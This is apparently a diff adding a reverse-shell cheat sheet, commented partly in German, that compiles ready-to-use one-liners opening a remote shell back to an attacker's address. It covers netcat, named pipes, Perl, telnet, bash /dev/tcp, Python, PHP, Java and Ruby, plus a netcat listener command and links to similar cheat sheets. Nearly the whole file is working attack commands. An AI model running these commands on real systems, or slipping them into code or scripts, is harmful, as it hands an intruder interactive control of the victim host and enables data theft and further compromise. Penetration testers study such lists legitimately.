@@ -1,0 +1,69 @@
+#Reverse Shells mit normalen Commands
+####################################
+http://www.gnucitizen.org/blog/reverse-shell-with-bash/
+http://bernardodamele.blogspot.ch/2011/09/reverse-shells-one-liners.html
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+#Listener Attack
+nc -l -v 192.168.1.34 8080
+
+
+#Target verschieden Möglichkeiten
+
+#Netcat
+#verschiedene Möglichkeiten, hängt von netcat version und compila Flags ab
+/bin/sh | nc 192.168.1.34 8080
+nc -c /bin/sh 192.168.1.34 8080
+nc -e /bin/sh 10.0.0.1 1234
+rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.34 8080 0/tmp/p
+rm -r /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+
+#Perl
+#braucht kein /bin/sh
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.34:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+#braucht /bin/sh
+perl -e 'use Socket;$i="192.168.1.34";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+#Telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445 
+
+
+#Another way
+#On the target we have to perform some bash-fu. We will create a new #descriptor which is assigned to a network node. Then we will read and #write to that descriptor
+$ exec 5<>/dev/tcp/192.168.1.34/8080
+$ cat <&5 | while read line; do $line 2>&5 >&5; done
+
+
+#Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+
+#Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+#Php
+#This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+#Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+#Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+
+
+
+
+
